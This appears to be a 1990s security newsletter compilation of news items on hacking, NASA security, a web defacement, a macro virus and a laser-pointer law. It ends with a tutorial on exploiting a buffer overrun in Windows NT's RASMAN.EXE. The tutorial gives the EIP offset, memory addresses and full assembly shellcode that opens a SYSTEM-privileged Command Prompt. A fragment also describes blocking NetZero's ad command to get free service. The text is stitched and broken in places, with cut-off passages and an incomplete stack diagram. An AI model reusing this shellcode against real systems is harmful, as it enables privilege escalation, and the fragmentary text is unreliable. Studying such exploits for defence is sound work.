      to report to the probation office in Richmond at 4 p.m. every Friday.
      Schwartz said he did his best to comply, leaving as soon as classes or work
      were through and driving hard to make the deadline. But he was late three
      times, clocking in at 4:25 p.m. one time, at 4:31 p.m. another time and at
      4:16 p.m. another. 

               After using several lawyers, the family hired Houston attorney Dick
      DeGuerin to try again to get the probation terminated early. Schwartz
      obtained a letter from an associate dean at Baylor, saying he lacked 39 hours
      to graduate and would have to have access to a computer to complete his
      course work. 

               An assistant professor at Baylor wrote to Judge Smith, asking that
      Schwartz be allowed to use a computer ``and move on to a career in
      business.'' 

               While supportive letters were filling Schwartz's court file, Elliott was
      getting tips that the probationer was actively using the computer, the Internet
      and e-mail at Baylor. 

               The second motion to revoke his probation was filed in March. It is set
      for a June 10 hearing before Smith, who has a reputation around the
      courthouse of being tough on wayward probationers. 

               The Schwartz family views the latest development as continued torture,
      referring to Elliott as a persecutor instead of a prosecutor. 

               ``The goal is to put him in jail. That's what they want,'' said Linda
      Schwartz, 47. ``He was young and foolish,'' she said, but he has paid for his
      mistake. ``Now we don't know what to do. We're going crazy.'' 

               Elliott, meanwhile, is preparing for the hearing. If Schwartz's probation
      is revoked, he could receive two to 10 years in prison. 

               ``How many times can you thumb your nose at the court and get away
      with it?'' Elliott asked. ``He would have had a very bright future with some
      company. Why couldn't he do something constructive with his time instead of
      trying to beat the system?''

      EAST BRUNSWICK, N.J. (BUSINESS WIRE) - Actinic Software LLC, a leading provider of plug-and-play e-commerce
      software, today announced that its flagship product, Actinic Catalog 3.0, offers total security for online shoppers.
    
      Catalog 3.0 is a low-cost, easy-to-use software package that provides all the tools for e-commerce merchants to rapidly build
      and deploy secure online stores. The software's military-strength security eliminates vulnerabilities for merchants and their
      customers, ensuring that sensitive information cannot be compromised.
    
      Recent breaches in e-commerce security have turned a critical eye to the safety of online shopping. Some platforms, whether
      ill-equipped or improperly installed, save customer order information in a decrypted file on the server, exposed to anyone with
      access to the Internet. This not only includes the experienced hacker, but the average Web surfer with the right search terms.
      Unlike other third-party e-commerce systems, Catalog 3.0 encrypts all financial details on the Web server, which is deleted
      once orders are downloaded to the merchant's PC. Using 128-bit encryption, approved for use by major banks, Catalog 3.0
      guarantees complete protection for online shoppers.
    
      "To avoid placing confidential customer information in jeopardy, e-commerce platforms must cover all the bases when it comes
      to ensuring online security -- from protecting files stored on the Web server, to accounting for the possibility of human error,"
      explained Kevin Grumball, CEO of Actinic Software. "Catalog offers an easy-to-use interface, and keeps sensitive information
      encrypted at all times, eliminating all possible security hazards for online shoppers."
    
      To ensure total e-commerce security, Catalog 3.0 encrypts sensitive data on the buyer's PC using a Java applet, and also
      operates with SSL sites. Credit-card purchases are securely processed through the site using 128-bit encryption. Orders are
      downloaded directly to the merchant's PC for processing. The Web server is used only as a mailbox, to which only the
      merchant holds the key. No sensitive data is ever visible on the server, and all details are stored safely on the merchant's PC,
      providing customers with the end-to-end security they need.
    
      Catalog 3.0 offers all the components necessary to build a fully secure e-commerce site. The total solution includes a
      Web-based catalog, electronic shopping cart, online ordering, expanded payment options, encrypted security, and more.
      Catalog 3.0 is available now, priced at $399. Contact Actinic for more details.

      NASA Vulnerable To Attack 

 
      contributed by McIntyre 
      The General Accounting Office released a report yesterday (Thursday) that labels 135 of 155 of NASAs
      mission-critical systems as not meeting the agency's own requirements for security. The GAO enlisted the
      help of the NSA to simulate an attack on NASA using publicly available tools such as war dialers. Although
      NASA performed an internal review of its information security policies last May that found many of the same
      problems identified by the GAO, few of the recommended fixes had been implemented. Satellite command and
      control systems as well as launch controls are not linked to the internet and where not at risk during 
      these simulated attacks.

      GAO unearths computer security weaknesses at
      NASA
 
      BY DIANE FRANK (dfrank@fcw.com)
 
      Many of NASA's mission-critical information systems are vulnerable to
      attack, and almost all the systems do not meet the agency's own requirements
      for risk assessment, according to a General Accounting Office report released
      today.
 
      In tests conducted by GAO at one of NASA's field centers, experts were
      able to penetrate several mission-critical systems, including one responsible for
      calculating the positioning data for spacecraft.
 
      "Having obtained access to these systems, we could have disrupted NASA's
      ongoing command and control operations and stolen, modified or destroyed
      system software and data," the report states.
 
      GAO attributed much of the success of the attacks to NASA's lack of
      consistent information security management and policies as suggested by
      GAO's 1998 Executive Guide. And although NASA performed a special
      review of its information security program last May that found many of the
      same problems identified by GAO, few of the recommended fixes have been
      started, according to the report.
 
      GAO recommended that NASA put in place an agencywide security program
      addressing five areas: assessing risks and evaluating needs; implementing
      policies and controls; monitoring compliance with policy and effectiveness of
      controls; providing computer security training; and coordinating responses to
      security incidents.

      Yet another Cold Fusion hole is responsible for the security breeches of the web site of the state of
      Vermont. Bob West, the state's deputy chief information officer, claimed the state's computers that contain
      the home page and other public documents are not considered secure against computer attack. (There are
      a lot of pretty funny, or pretty sad, quotes in this article.)

      Hackers get into state of Vermont computer system 

      By Wilson Ring, Associated Press, 05/21/99 09:48 
     
      MONTPELIER, Vt. (AP) - Hackers cracked into the state's computer system Thursday, inserting
      at least three unauthorized messages into it.
     
      State officials said they received no complaints from the public about anything that appeared on the
      state's World Wide Web site.
     
      A computer security official from Boston said that for at least four hours Thursday morning a visitor
      to the state's home page was greeted by a page entitled ''Hackfactor X'' that contained a series of
      profanities and the message, ''Well, I can see how well our tax dollars are being spent on computer
      security.''
     
      Hidden deep into the state's system, which is not readily accessible to the public, was another
      message entitled ''A Changing World'' that was signed ''hacked for freedom,'' and another that
      carried the caption, ''use this only for good, not evil.''
     
      State officials were initially unaware of the assault on their computers. But once the location of the
      messages were pointed out by The Associated Press they were erased within minutes.
     
      Bob West, the state's deputy chief information officer, said there was no evidence the main Web
      page was tampered with.
     
      ''I am not sure where that came from,'' West said of the report. ''I would have gotten e-mails like
      crazy if that had happened.''
     
      But he was also unaware that the less public files had been tampered with until they were pointed
      out to him. ''Most people would never have found that,'' he said.
     
      In any event, the state's computers that contain the home page and other public documents are not
      considered secure against computer attack, West said.
     
      ''Anything on that box is backed up and is restorable and is not considered confidential,'' West said.
      If the system failed, ''it wouldn't stop any operation in state government.''
     
      Critical state business - such as personnel and tax records - is done on computers that are
      protected by ''firewalls'' and are believed invulnerable to unauthorized access, West said.
     
      The hacker took advantage of the software that runs the state's computer servers, said Weld Pond,
      a computer security consultant with the Boston company l0pht. The vulnerability of the software has
      been well known, but it was installed on many computer systems years ago and officials never
      bothered to correct the problem, Pond said.
     
      Pond looked at the state's page and said it appeared it was hacked twice on Thursday. The last
      illegal visitor ''closed'' the hole that allowed the site to be hacked, he said.
     
      ''Hackers definitely close holes after they are in,'' Pond said ''They don't want somebody else in it.''
     
      The attack on the state system was first reported on the computer Web site known as attrition.org.
      The site is used to point out to the information industry how vulnerable computer systems can be
      and to record those assaults for history.
     
      B.K. DeLong of Boston helps maintain the site. He said he got an e-mail message at about 4:30
      a.m. pointing out the assault on the Vermont system. He said the untraceable e-mail was probably
      sent by the hacker, who wanted to highlight his or her achievement.
     
      DeLong said he saw the Hackfactor X site at about 8:30. It had been taken off the state system by
      about 9 a.m.
     
      ''They can insist all they want, but it's been seen,'' DeLong said of West's denial about the
      tampering.
     
      The site that DeLong said was posted in place of the state's traditional home page can still be
      viewed at www.attrition.org/mirror/attrition.
     
      Computer hacking is a federal crime, but Vermont's U.S. Attorney, Charles Tetzlaff, said Thursday
      he was unaware of the assault on the state's home page

 49.0 NIST May Be Named Info Security Clearing House 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      The House Science Committee will soon push to update the 1989 Computer Security Act. The new bill will
      closely resemble the Computer Security Enhancement Act of 1997 which never made it out of the Senate.
      This new legislation would tap the National Institute of Standards and Technology (NIST) as the lead agency
      for information security. (What about NIPC, CERT, and the FBI? How many agencies do we need?) The new bill
      also push for increased federal use of commercial off-the-shelf products for security needs.

      House panel aims to bolster security law
 
      BY MARGRET JOHNSTON (margret_johnston@fcw.com)
 
      WASHINGTON, D.C. -- The House Science Committee plans to make
      another push to update a 1989 law that requires civilian agencies to take
      measures to protect their computer systems, according to Rep. Constance
      Morella (R-Md.), chairwoman of the Technology Subcommittee of the House
      Science Committee.
 
      The new bill, which could be introduced as early as next week, would revamp
      the 10-year-old Computer Security Act. The bill will closely resemble the
      Computer Security Enhancement Act of 1997, which the House passed only
      to have it die in the Senate last year, said Morella, speaking at a symposium
      sponsored by the SmartCard Forum.
 
      Like the 1997 bill, the proposed legislation would tap the National Institute of
      Standards and Technology as the lead agency for information security. The
      preceding bill also would have required NIST to promote federal use of
      commercial off-the-shelf products for civilian security needs.
 
      The committee first began its effort to revamp the existing law to reflect the
      proliferation of network technology that has left agency data more vulnerable
      to corruption and theft, Morella said in 1997.

 50.0 097M.Tristate Macro Virus Contained

      Symantec and Network Associates have posted new definitions to eradicate the 097M.Tristate macro virus.
      This new virus also known as Triplicate and Crown cross-infects Microsoft Word documents, Excel
      spreadsheets, and PowerPoint presentations. The virus has the ability to destroy data and removes
      virus-warning protection from both Excel and Word.

      Hunters Contain Office
      Macro Virus 
 
      Symantec, McAfee inoculate for 097M.Tristate
      macro virus.
 
      by Christian McIntosh, PC World 
      May 20, 1999, 6:38 p.m. PT 
 
      The heat of the race to detect and nullify new viruses appears second only to the contest among virus
      fighters to be first with the cure. 
 
      Two antivirus leaders, Symantec and Network Associates' McAfee division, have nabbed a new macro
      virus that threatens files created by Microsoft Office applications. Both have posted new definitions that
      detect and eradicate the 097M.Tristate macro virus. 
 
      You can download the new definitions for any Symantec antivirus product from LiveUpdate, the
      company's antivirus service, which pushes virus updates to registered Symantec customers. 
 
      "It's a scheduled component that checks frequently for new virus threats," says Enrique Salem, Symantec's
      chief technology officer. 
 
      Unregistered Symantec customers can get the new definitions from the Symantec AntiVirus Research
      Center on the company's Web site. 
 
      You can also eradicate the 097M.Tristate virus using McAfee's VirusScan updated with the most recent
      definition file, available on the company's Web site. VirusScan also will prompt you to periodically update
      your virus definitions data.
 
      "Trendy" Macro Viruses 
 
      Macro viruses similar to 097M.Tristate are popular among virus writers, according to Symantec officials.
      The 097M.Tristate macro virus cross-infects Microsoft Word documents, Excel spreadsheets, and
      PowerPoint presentations. 
 
      The 097M.Tristate virus creates a viral workbook called BOOK1 in the Excel startup directory. In PowerPoint,
      097M.Tristate adds a viral module that's linked to the AutoShape object covering an entire slide. During its
      final leg, 097M.Tristate replaces the content of an infected Word document with viral code.
 
      Once considered the exclusive domain of research labs, macro viruses have transitioned into general
      circulation. Despite its prolific reproduction, Symantec classifies 097M.Triplicate as rare, saying it has 
      yet to spread beyond the United States. The 097M.Tristate macro virus, also known as Triplicate and Crown, is
      currently the eighth most common virus submitted to Symantec's lab. The company's Scan & Deliver system
      has received 132 submissions of the 097M.Tristate virus in the past two weeks.
 
      McAfee classifies 097M.Tristate as high risk. The virus apparently removes virus-warning protection from both
      Excel and Word.

 51.0 "Hackers" Ruin Online Poll

      contributed by The Silicon Sorceror 
      According to the Toronto Star, "online hackers" used ballot stuffing to spoil an online poll to find the 
      popular winner of Ontario's political candidate debate. The poll was designed so that each person could vote 
      only once, but apparently it wasn't designed well enough and "some political junkies with computer skills had
      the time to write programs defeating the precautions" (Translation: Somebody clicked their mouse button
      about 5 times and banged out a script).

      |       NetZero sends a command, I believe through ICMP, which turns the dialup           |

      |                                                                                         |
      |       Now, the firewall blocks this command which turns the program into the ad banner. |
      |  Therefore, the ad NEVER starts up, and as far as Net Zero knows, the command went      |
      |  through and BLAM, you're running a free ISP with NO ADS.                               |

 53.0 Laser Pointers Illegal?

      contributed by Code Kid 
      The San Francisco Housing and Social Policy Committee
      will soon classify laser pointers in the same category as
      spray paint, making it illegal for those under 18 to
      purchase or posses them. Since limiting the sale of
      spray paint cans has worked exceedingly well in
      preventing graffiti in major cities it is thought that a
      similar ban on laser pointers would be equally effective.

     Use a laser, go to jail

     EXAMINER EDITORIAL WRITER          May 20, 1999 



     CONSIDER the
     what-can-go-wrong-WILL-go-wrong provisions of Murphy's Law and its corollaries, such as the Rule
     of Toast by which the buttered side always hits the floor. Next comes the Law of Unintended
     Consequences, particularly the high-tech subsections that gave us e-mail spam, undumpable
     atomic waste, MTBE in our water, extortionate ATM fees and surrender of privacy to corporate
     hackers. 

     Question: What do you get when you marry the laws of Murphy and Unintended Consequences? 

     Answer: The laser pointer. 

     These ingenious devices, originally intended as high-tech aids to professors and lecturers, send little
     red beams as far as 1,500 feet. And, according to San Francisco Supervisor Michael Yaki, "These
     so-called toys can distract, annoy and even injure other people when misused." 

     Accordingly, Yaki persuaded the board's Housing and Social Policy Committee on to approve
     Tuesday a proposed ordinance patterned after laws in New York and other cities. It would make it a
     crime to sell laser pointers to persons under age 18. It would compel storekeepers to keep them locked
     up - as with cans of spray paint suitable for graffiti and tags - to discourage teen shoplifters. It would
     make it a serious crime to point a beam at another person's face or, because of the possibility of a
     driver's temporary blindness, at a moving vehicle. 

     Yes, it's true that the ban on sale of spray paint to juveniles didn't exactly put an end to tags and
     graffiti. And laser pointers are considerably less dangerous than the lethal handguns far too
     accessible to far too many kids. But we agree with Police Lt. Patricia Jackson, who called the pointers
     an annoyance with disruptive potential. 

     The full board should approve Yaki's law and hope that it won't have unintended consequences of its
     own.

      This document is for educational purposes only and explains what a buffer overrun is and shows how they can be exploited on the Windows NT 4 operating system
      using RASMAN.EXE as a case study. We will take a look at Windows NT processes, virtual address space, the dynamics of a buffer overrun and cover certain

      in RASMAN.EXE. This document may be freely copied and distributed only in its entirety and if credit is given.
      
      Cheers, David Litchfield 
      
      What is a buffer overrun?
      
      A buffer overrun is when a program allocates a block of memory of a certain length and then tries to stuff too much data into the buffer, with the extra overflowing
      and overwritting possibly critical information crucial to the normal execution of the program. Consider the following source: 
      
      #include <stdio.h>
      int main ( )
      {
              char name[31];
              printf("Please type your name: ");
              gets(name);
              printf("Hello, %s", name);
              return 0;
      }
      
      When this source is compiled and turned into a program and the program is run it will assign a block of memory 32 bytes long to hold the name string. Under normal
      operation someone would type in their name, for instance "David", and the program would then print to the screen "Hello, David". David is 5 letters long, with each
      letter taking up a single byte. The end of a string, though, is denoted by a thing called a null terminator - which is basically a byte with a value of zero. So we need to
      add a null terminator to the end of the string making a total length of 6 bytes. It is clear that 6 bytes will fit into the 32 bytes set aside to store the name string. If
      however, instead of entering "David", we entered 
      
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
      
      that is 40 capital As, when the program reads in our input and places it in our buffer it overflows. 40 will definitely not fit into 32. 
      
      It so happens that if we enter 40 As we completely overwrite the contents of a special CPU register known as the Instruction Pointer or EIP - the E stands for
      Extended by the way. A quick explanation of a register - a computer's processor has small memory storage units called registers. Access to the values held in these
      registers is very quick. These registers have special names and can hold memory addresses and variables. The EIP is one of these registers and holds the memory
      address of the next instruction to execute. What do I mean by instruction? A program contains a list of instructions for the processor to carry out in order for the
      program to do its job, much like a recipe contains instructions for a cook to carry out in order to make a cake. These instructions are known as operation codes or
      opcodes for short. So when a program is running and the processor is executing one of the program's instructions the EIP holds the memory address where the next
      instruction to be executed can be found. After the current instruction has been executed the processor goes to that memory address and pulls in the instruction found
      there and then increments the EIP and the executes that instruction. This process of pulling the opcode from the memory address pointed to by the EIP, then
      incrementing the EIP then executing that instruction continues until the program exits. 
      
      Going back to our code, the fact that we have overwritten the EIP means that we can effectively tell the CPU to go to a memory address of our choosing and pull
      down the instruction found there and execute that. Because we are filling the buffer with As we overwrite the EIP with 0x41414141 - 41 is the hex value for a capital
      A. The processor then goes to address 0x41414141 and tries to read in the instruction found at that address. If there's no instruction there we get a thing known as
      an Access Violation. Most people will know of this as a message popping up saying something like "The Instruction at '0x41414141' referenced memory at
      '0x41414141'. The memory could not be read." If we had filled our buffer with Bs we would overwrite the EIP with 0x42424242 essentially telling the processor to
      go that that memory address to get the next instruction and more than likely we'd get the same Access Violation. 
      
      Exploiting a buffer overrun.
      
      As you'll see later on, being able to overwrite the EIP is vital to exploiting a buffer overrun. When you exploit a buffer overrun you basically get the processor to
      execute instructions or code of your choosing getting the program to do something it would not normally do. You do this by pointing the EIP back into the buffer
      which you load with your own opcodes which are then executed. This begs the question , "Why would someone want to do this?" 
      
      Windows NT, like UNIX systems, require a user to log into the system. Some users are very powerful, such as the Administrator and others are just your average
      normal user that aren't as powerful. If a normal user wanted to become equivalent to the Administrator and thus just as powerful with almost full control of the system
      they could exploit a buffer overrun to attain this. The problem is the buffer overrun needs to be in a process that has enough power and privileges to be able to make
      them an Administrator so there is no point in buffer overruning a process that they, the user themselves, have started. They need to buffer overrun a process started
      by the system and then get the process to execute their own arbitary code. The system account is very powerful, and if you can get a system process to do
      something, such as open a Command Prompt, then it will run with system privileges. In Windows NT, if a process starts a new child process then the child process
      normally inherits the access token of the parent process, normally because some processes can be started using the Win32 CreateProcessAsUser ( ) function that
      will start the new process under the security context of another user and thus the new process will have a different access token than the parent process. An Access
      Token is like a set of keys - they denote a user's rights and privileges that determine what they can and cannot do to the machine. An example of this is screen
      savers. The winlogon.exe system process is responsible for starting a user's screen saver. As oppossed to runing the screen saver in the security context of the
      system winlogon uses CreateProcessAsUser ( ) to start the screen saver in the security context of the currently logged on user. I digress - back to buffer overruns. In
      this case study we'll look at the buffer overrun in RASMAN.EXE, a system process, and get it to open a Windows NT Command Prompt. This Command Prompt
      will have the access token of the system account and so will any other processes started from it. But first a bit more on an NT process' virtual memory layout. 
      
      A process embodies many things such as, amongst others, a running program, one or more threads of execution, the process' virtual address space and the dynamic
      link libraries (DLLs) the program uses. The process has 4 GB of virtual address space to use. Half of this is, from address 0x00000000 to 0x7FFFFFFF, private
      address space where the program, its DLLs and stack (or stacks in the case of a multihthreaded program) are found and the other half, address 0x80000000 to
      0xFFFFFFFF is the system address space where such things as NTOSKRNL.EXE and the HAL are loaded. As a side note, this default behaviour can be changed
      as of service pack three - you can specify a switch in the boot.ini - /3GB - that will assign 3 GB as private address space and 1 GB as system address space. This is
      to boost the performance of programs, such as databases, the require large amounts of memory. 
      
      When a program is run NT creates a new process. It loads the program's instructions and the DLLs the program uses into the private address space and marks the
      pages it uses as read-only. Any attempt to modify pages in memory marked as read only will cause an Access Violation. The first thread is started and a stack is
      initialised. 
      
      The Stack
      
      What's the simplest way to describe a stack? Try this: Imagine a carpenter. He has tools, materials and instructions. To be able to make something though they need
      a workbench. The stack is similar to this workbench. It is a place where he can use his tools to shape and model his raw materials. He can put something down on
      the workbench, say waiting for the glue to dry on two bits of wood and do something else. When that task is complete he can come back to his two bits of wood
      and continue with that. The workbench is where most of the work is done. 
      
      So too, in a process, the stack is where most things are done. It is a writeable area of memory that dynamically shrinks and grows as is needed or determined by the
      program's execution. When a programatic task is started it'll place data on the stack, whether these be strings, memory addresses, integers or whatever, then
      manipulate them and when the task has completed it will return the stack to its original state so that the next task can use it if it needs to. Working in this way the
      process interacts with the stack using a method known as Last In, First Out or LIFO. 
      
      There are two registers that are crucial to the stack's functionality - they are used by the program to keep track of where data can be found in memory. These two
      registers are the ESP and the EBP. 
      
      The ESP, or the Stack Pointer points to the top of the stack. The ESP contains the memory address where the top of the stack can be found. The ESP can be
      changed in a number of ways both indirectly and directly.When something is PUSHed onto the stack the ESP increases accordingly. When something is POPed off
      of the stack the ESP shrinks. The PUSH and POP operations modify the ESP indirectly. But then you can manipulate the ESP directly, with say an instruction of
      "SUB esp,04h" which pushes the stack out by four bytes or one word. For those that haven't yet been numbed into boardem, something may just have irked: how is
      it that you SUBtract 4 from the ESP and yet the ESP is pushed out? Well this is because the stack works backwards. The bottom of the stack uses a memory
      address higher than the top of the stack: 
      
      ----------------0x12121212 Top of the stack
      ...
      ...
      ----------------0x121212FF Bottom of the stack
      
      Here we have definitive proof that the fathers of modern computing were indeed closet sadists or had shares in makers of paracetamol - occasionally they throw in
      gems like this to make that headache that bit more acute. When we say the stack increases in size the address held in the ESP decreases. Conversly when the stack
      size decreases the address held in the ESP increases. Reaching for the Asprin yet? 
      
      Our second stack related register is known as the EBP or the Base Pointer. The EBP holds then memory address of the bottom of the stack - more accurately it
      points to a base point in the stack that we can use a reference point within a given programatic task. The EBP must have meaning to a given task and to facilitate this
      before the task's real business is started a setup procedure known as the "procedure prologue" is first completed. What this does is, firstly, save the current EBP by
      PUSHing it onto the stack. This is so that the processor and program will know where to pick up from after the currently executing task has completed. The ESP is
      then copied into the EBP thus creating a new Base Pointer that the currently executing task can use as a reference point irrespective of how the ESP changes during
      the task's execution. Continuing with this let's say an 11 character string was placed onto the stack - our EBP remains the same but the ESP has been pushed out by
      12 bytes. Then say an address was PUSHed onto the stack - our ESP is pushed out by another 4 bytes, though our EBP still remains the same. Now let's say we
      needed to reference the 11 byte string - we can do this by using our EBP: we know the first byte of our string (the pointer to the string) is twelve bytes away from
      the EBP so we can reference this string's pointer by saying,"the address found at EBP minus 12". (Remember the stack goes from a higher address to a lower
      address)
      
                                                RASMAN and buffer overruns. 
      
      Finding the buffer overrun
      
      The first thing you need to do to be able to exploit a buffer overrun is to a) know about an existing one or b) find your own one. In the case of RASMAN, the
      overrun was found by looking at the RAS functions and the structures the used. Notice that some of the functions, such as RasGetDialParams ( ), fill structures that
      contain characters arrays, much like char name[31] character array in the C code above. By playing around with rasphone.pbk file, the RAS Phone Book, where
      dialing details, such as the phone number to be dialed, are stored, you can root out these overruns. Make a phone book entry called "Internet", which dials into your
      ISP, dial it, and downloaded your mails. This is important as this adds to the Registry an entry for the domain name of your mail server as an Autodial location. That
      is, if you try to contact your mail server, from that point on, without being dialed into the Internet, the Connection manager would kick in and automatically dial for
      you. RASMAN is the process that handles this functionality. Once you have done this change the telephone number to a long string of As and then attempted to
      connect to your mail server, say, by opening Outlook Express. This causes RASMAN to read in from rasphone.pbk the telephone number to dial to be able to get
      to your mail server. But instead of the real telephone number the long string of As is read instead and fills a character array in the RAS_DIAL_PARAMS structure
      which overflows causing an Access Violation - at address 0x41414141. We've found a buffer overrun and, more exciting, overwritten the EIP. 
      
      Finding where the EIP is overwritten
      
      By experimenting with the length of the "telephone number" we find that we overwrite the EIP with bytes 296,297,298 and 299 of our string. (You'll find that, if you
      are actually following this, you'll need to reboot the system after the overflow to be able to restart the service, and you'll have to end tasks such as AthenaWindow
      and msmin.exe.) Once we have found where we overwrite the EIP it is time to get out the debugger - the debugging capabilities of Visual C++ are very good.
      Attach to the RASMAN process and then get it to dial - or attempt to at least. Wait for the access violation. 
      
      Analyze what's going on.
      
      Once the access violation has occured we need to look at the stack and the state of the CPU's registers. From this we can see that we also overwrite the EBP,
      which will come in handy later on and that the address of the first A of our "telephone number" is 0x015DF105. By getting RASMAN to access violate a number of
      times we find that the first A is always written to this address. This is the address we're going to set the EIP to so that the processor will look at that address for the
      next instrution to execute. We'll stuff the "telephone number" full of our own opcodes that will get RASMAN to do what we want it to do - our arbitary code. We
      then need to ask, "What do we want it to do?". 
      
      Where do you want to go today? - What do you want to acheive?
      
      The best thing to do, as we need to be at the console to get this to work, is get RASMAN to open up a Command Prompt. From here we can run any program we
      want with system privileges. The easiest way to get a program to run a Command Prompt, or any other program for that matter is to use the system ( ) function.
      When the system ( ) function is called it looks at the value of the ComSpec environment variable, normally "c:\winnt\system32\cmd.exe" on Windows NT and
      executes that with a "/C" switch. The function passes cmd.exe a command to run and the "/C" switch tells cmd.exe to exit after the command has finished executing.
      If we pass "cmd.exe" as the command - system("cmd.exe"); - this will cause the system function to open up cmd.exe with the "/C" switch and execute cmd.exe - so
      we are running two instances of the command interpreter - however the second one won't exit until we tell it to ( and nor will the first until the second one has exited.)
      
      Rather than the placing the opcodes that actually form the system ( ) function in our exploit string it would be easier to simply call it. When you call a function you tell
      the program to go to a certain DLL that contains the code for the function you are calling. The use of DLLs means that programs can be smaller in size - rather than
      each program containing the necessary code for each function used they can call a shared DLL that does contain the code. DLLs are said to export functions - that
      is the DLL provides an address where a function can be found. The DLL also has a base address so the system knows where to find that DLL. When a DLL is
      loaded into a process' address space it will always be found at that base address and the functions it exports can then be found at an entry point within the base. The
      system ( ) function is exported msvcrt.dll (the Microsoft Visual C++ Runtime library) which has base address of 0x78000000 and system ( ) entry point can be
      found at 000208C3 (in version 5.00.7303 of msvcrt.dll anyway) meaning that the address of the system ( ) function is 0x780208C3. Hopefully msvcrt.dll will
      already be loaded into RASMAN's address space - if it isn't we'll need to use LoadLibrary ( ) and GetProcAddress ( ). Fortunately RASMAN does use msvcrt.dll
      and so it is already in the process address space. This makes the job of exploiting the buffer overrun very easy indeed - we'll simply build a stack with our string of
      the command to run (cmd.exe) and and call it. What makes it even better is that the address 0x780208C3 has no nulls (00) in it. Nulls can really complicate issues. 
      
      To find out what the stack needs to look like when a normal program calls system("cmd.exe"); we need to write one that does and debug it. We'll need to get our
      arbitary code to build a duplicate image of the stack as it appears in our program just before system ( ) is called. Below is the source of our program. Compile and
      link it with kernel32.lib then run and debug it. 
      
      #include <windows.h>
      #include <winbase.h>
      
      typedef void (*MYPROC)(LPTSTR);
      int main()
      {
              HINSTANCE LibHandle;
              MYPROC ProcAdd;
      
              char dllbuf[11]  = "msvcrt.dll";
              char sysbuf[7] = "system";
              char cmdbuf[8] = "cmd.exe";
      
      
              LibHandle = LoadLibrary(dllbuf);
      
              ProcAdd = (MYPROC) GetProcAddress(LibHandle, sysbuf);
      
              (ProcAdd) (cmdbuf);
      
              return 0;
      }
      
      
      On debugging and examining the stack prior to calling system ( ) [(ProcAdd)(cmdbuf); in the above code] we see that starting from the top of the stack we find the
      address of the "c" of cmd.exe, then the address of where the system ( ) function can be found, the null terminated cmd.exe string and a few other things that are too
      important. So to emulate this we need the null terminated "cmd.exe"string in the stack, then the address of the system function and then the address which points to
      our "cmd.exe" string. Below is a picture of what we need the stack to look like before calling system ( ) 
      
      -------------------- ESP (Top of the Stack)
      XX
      --------------------
      XX

      65      e
      --------------------
      00
      -------------------- EBP (Bottom of the stack)
      
      where the top 4 XXs are the address of "c". We don't need to hardcode this address into our exploit string because we can use the EBP as a reference - remember
      it is the base pointer. Later on you'll see that we load the address where the first byte of our cmd.exe string can be found into a register using the EBP as a reference
      point. 
      
      Writing the Assembly.
      
      This is what we need the stack to look like when we call system ( ). How do we get it there? We have to build it ourselves with our opcodes - we can't just put it in
      our exploit string because as you can see there are nulls in it and we can't have nulls. Because we have to build it this is where knowing at least a little assembly
      language comes in handy. The first thing we need to do is set the ESP to an address we can use for our stack. (Remember the ESP points to the top of the stack.)
      To do this we use: 
      
      mov esp, ebp 
      
      This moves the EBP into the ESP - rember we overwrite the EBP as well as the EIP which is really handy. We'll overwrite the EBP with an address we know we
      can write to - we will use 0x015DF124. Consequently the ESP, after we move the EBP into it, the top of the stack will be found at 0x015DF124. 
      
      We then want to push EBP onto the stack. This is our return address. 
      
      push ebp 
      
      This has the effect of pushing the ESP down 4 bytes and so ESP is now 0x015DF120. After this we then want to move the ESP into the EBP: 
      
      mov ebp,esp 
      
      This completes our own procedure prologue. With this done we can go about building the stack the way we want it to look 
      
      The next thing we need to do is get some nulls onto the stack. We need some nulls because we need to have our cmd.exe string terminated with a null. Even though
      the cmd.exe string isn't there yet it will be but we have to do things in reverse order. Before we can push some nulls onto the stack we need to make some. We do
      this by xoring a register with itself- we'll use the EDI register. 
      
      xor edi,edi 
      
      This will set the EDI to 00000000 and then we push it onto the stack using 
      
      push edi 
      
      This also has the added effect of pushing out our ESP to 0x015DF11C. But "cmd.exe" is 7 bytes long and we only have room for 4 bytes so far and don't forget we
      need a null tacked on the end of our string so we need to push the ESP out another 4 bytes to give us a total of 8 bytes of space between the ESP and the EBP. We
      could push the edi again, but for varitey we'll just sub the ESP by 4. 
      
      sub esp,04h 
      
      Our ESP is now 0x015DF118 and our EBP is 0x015DF120. Our next job is to get cmd.exe written to the stack. To do this we'll use the EBP as a reference point
      and move 63, the hex value for a small "c" into the address offset from the EBP minus 8. 
      
      mov byte ptr [ebp-08h],63h 
      
      We do the same for the "m", the "d", the ".", the first"e", the "x" and the final "e". 
      
      mov byte ptr [ebp-07h],6Dh mov byte ptr [ebp-06h],64h mov byte ptr [ebp-05h],2Eh mov byte ptr [ebp-04h],65h mov byte ptr [ebp-03h],78h mov byte ptr
      [ebp-02h],65h 
      
      Our stack now looks like this: 
      
      ----------------------------------------------------- ESP
      63              c
      -----------------------------------------------------
      6D              m
      -----------------------------------------------------
      64              d
      -----------------------------------------------------
      2E              .
      -----------------------------------------------------
      65              e
      -----------------------------------------------------
      78              x
      -----------------------------------------------------
      65              e
      -----------------------------------------------------
      00
      ----------------------------------------------------- EBP
      
      All that we need to do now is put the address of system( ) onto the stack and the pointer to our cmd.exe string on top of that - once that is done we'll call the system
      ( ) function. 
      
      We know that the system( ) function is exported at address 0x780208C3 so we'll move this into a register and then push it onto the stack: 
      
      mov eax, 0x780208C3 push eax 
      
      We then want to put the address of the "c" of our "cmd.exe" string onto the stack. We know that the "c" can be found eight bytes away from our EBP so we'll load
      the address 8 bytes less than the EBP into a register: 
      
      lea eax,[ebp-08h] 
      
      The EAX register now holds the address where our cmd.exe string begins. We then want to push this onto the stack: 
      
      push eax 
      
      With this done our stack is built and we are ready to call system ( ) but we don't call it directly - again we use the indirection of using our EBP as a reference point
      and call address found at EBP minus 12 (or 0C in hex): 
      
      call dword ptr [ebp-0ch] 
      
      Here is all our code strung together. 
      
      mov esp,ebp
      push ebp
      mov ebp,esp
      xor edi,edi
      push edi
      sub esp,04h
      mov byte ptr [ebp-08h],63h
      mov byte ptr [ebp-07h],6Dh 
      mov byte ptr [ebp-06h],64h
      mov byte ptr [ebp-05h],2Eh
      mov byte ptr [ebp-04h],65h
      mov byte ptr [ebp-03h],78h
      mov byte ptr [ebp-02h],65h
      mov eax, 0x780208C3
      push eax
      lea eax,[ebp-08h]
      push eax
      call dword ptr [ebp-0ch]
      
